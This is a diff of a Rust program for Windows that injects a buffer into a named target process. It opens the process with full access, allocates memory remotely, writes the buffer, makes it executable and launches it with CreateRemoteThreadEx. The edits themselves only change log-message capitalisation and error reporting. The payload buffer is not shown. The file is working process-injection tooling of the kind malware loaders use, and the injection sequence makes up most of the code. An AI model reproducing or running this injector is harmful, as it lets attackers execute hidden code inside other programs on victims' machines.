@@ -1,6 +1,6 @@
 use std::ptr;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows::Win32::Foundation::{CloseHandle, GetLastError};
+use windows::Win32::Foundation::CloseHandle;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
@@ -48,10 +48,10 @@ fn main() {
         if process.name() == target_name {
             let pid_u32 = pid.as_u32();
             unsafe {
-                println!("[i] Trying to open a handle for the process");
+                println!("[i] Trying to open a Handle for the Process");
                 match OpenProcess(PROCESS_ALL_ACCESS, false, pid_u32) {
                     Ok(hprocess) => {
-                        println!("[i] Allocating memory in the process");
+                        println!("[i] Allocating Memory in the Process");
                         let haddr = VirtualAllocEx(
                             hprocess,
                             Some(ptr::null_mut()),
@@ -61,7 +61,7 @@ fn main() {
                         );
 
                         if haddr.is_null() {
-                            eprintln!("[!] Failed to allocate memory in target process.");
+                            eprintln!("[!] Failed to Allocate Memory in Target Process.");
                             CloseHandle(hprocess);
                             continue;
                         }
@@ -73,8 +73,8 @@ fn main() {
                             buf.as_ptr() as _,
                             buf.len(),
                             None
-                        ).unwrap_or_else(|_e| {
-                                eprintln!("[!] WriteProcessMemory Failed With Error: {:?}",GetLastError());
+                        ).unwrap_or_else(|e| {
+                                eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
                                 CloseHandle(hprocess);
                                 std::process::exit(-1);
                         });
@@ -86,13 +86,13 @@ fn main() {
                             buf.len(),
                             PAGE_EXECUTE_READWRITE,
                             &mut oldprotect,
-                        ).unwrap_or_else(|_e| {
-                            eprintln!("[!] VirtualProtectEx Failed With Error: {:?}",GetLastError());
+                        ).unwrap_or_else(|e| {
+                            eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
                             CloseHandle(hprocess);
                             std::process::exit(-1);
                         });
 
-                        println!("[+] Creating a remote thread");
+                        println!("[+] Creating a Remote Thread");
                         let tid: u32 = 0;
                         let hthread = CreateRemoteThreadEx(
                             hprocess,
@@ -103,8 +103,8 @@ fn main() {
                             0,
                             None,
                             Some(tid as _),
-                        ).unwrap_or_else(|_e| {
-                            eprintln!("[!] CreateRemoteThreadEx Failed With Error: {:?}",GetLastError());
+                        ).unwrap_or_else(|e| {
+                            eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                             CloseHandle(hprocess);
                             std::process::exit(-1);
                         });
@@ -118,7 +118,7 @@ fn main() {
                         break;
                     }
                     Err(pid) => {
-                        eprintln!("[!] Error getting process identifier {pid}");
+                        eprintln!("[!] Error Getting Process Identifier {pid}");
                     }
                 }
             }
